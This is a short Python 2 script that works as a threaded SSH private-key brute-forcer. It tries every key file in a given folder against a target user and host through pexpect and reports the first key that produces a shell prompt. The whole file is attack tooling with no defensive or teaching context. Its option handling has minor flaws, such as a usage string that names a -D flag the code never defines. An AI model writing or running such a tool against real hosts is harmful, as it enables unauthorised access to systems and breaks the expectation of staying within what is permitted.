#encoding:utf-8
import os;
import pexpect;
Password_Mismatch="Permission denied";
AreYouContinue = "Are you sure you want to continue";
TargetcloseConnect = "Connection closed by remote host";
Fails=0;
import threading;
LOCK = threading.BoundedSemaphore();
def CheckKey(Host,User,KeyFile):
	global Fails,Password_Mismatch,AreYouContinue,TargetcloseConnect;
	try:
		CmdStr="ssh "+User+"@"+Host+" -i "+KeyFile+" -o PasswordAuthentication=no";
		SSHCon = pexpect.spawn(CmdStr);
		#print CmdStr;
		ExpectArr=[pexpect.TIMEOUT,Password_Mismatch,AreYouContinue,TargetcloseConnect,"\$","#"];
		#print str(ExpectArr);
		ret=SSHCon.expect(ExpectArr);
		if ret==1:
			print "[-]Key mismatch ! key file:"+KeyFile;
		elif ret==2:
			SSHCon.sendline("yes");
			CheckKey(Host,User,KeyFile);
			return;
		elif ret==3:
			Fails += 1;
		elif ret>3:
			#print "[+]Success match Key ! Key file name :"+KeyFile;
			print "Msg:",SSHCon.before+"  "+str(ret);
			exit(0);
		None;
	except Exception,e:
		print "[！] Error:",e;
		None;
	finally:
		LOCK.release();
		None;
	None;

def Main():
	import optparse;
	parser = optparse.OptionParser("Usage: python Script.py -H <Host> -U <UserID> -D <KeyDictionary>");
	parser.add_option("-H","--Host",dest="Host",type="string",help="Host: Need a host eg:localhost / 127.0.0.1");
	parser.add_option("-U","--User",dest="User",type="string",help="User: Need a user id eg:root / jh");
	parser.add_option("-F","--KeyFolder",dest="KeyFolder",type="string",help="KeyFolder: Need a key folder name");
	(options,args) = parser.parse_args();
	HOST = options.Host;
	USER = options.User;
	KeyFolder = options.KeyFolder;
	if HOST == None or USER == None or KeyFolder == None :
		print "[!] Argument need help (you need input python Script.py --help)";
		exit(0);
	for CurRow in os.listdir(KeyFolder):
		print "[*]CurRow = ",CurRow;
		#CheckKey(HOST,USER,os.path.join(KeyFolder,CurRow));
		LOCK.acquire();
		threading.Thread(target=CheckKey,args=(HOST,USER,os.path.join(KeyFolder,CurRow))).start();

if __name__ =="__main__":
	Main();
